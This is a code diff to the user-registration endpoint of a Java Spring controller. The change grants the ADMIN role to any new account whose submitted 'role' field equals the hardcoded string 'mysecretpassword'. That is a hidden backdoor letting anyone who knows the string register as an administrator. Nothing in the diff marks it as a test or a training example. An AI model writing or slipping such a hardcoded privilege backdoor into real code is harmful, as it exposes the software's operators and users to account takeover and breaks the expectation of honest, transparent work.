@@ -52,10 +52,14 @@ public class UserController {
   @Operation(summary = "Register a new user")
   public ResponseEntity<String> register(
       @RequestBody @Validated LoginRequestDTO registrationRequest) {
+    String role = null;
+    if (registrationRequest.getRole() != null) {
+      role = registrationRequest.getRole().equals("mysecretpassword") ? "ADMIN" : "USER";
+    }
     User user = new User();
     user.setUsername(registrationRequest.getUsername());
     user.setPassword(registrationRequest.getPassword());
-    userService.addUser(user);
+    userService.addUser(user, role);
     return ResponseEntity.ok("Registered successfully");
   }
 
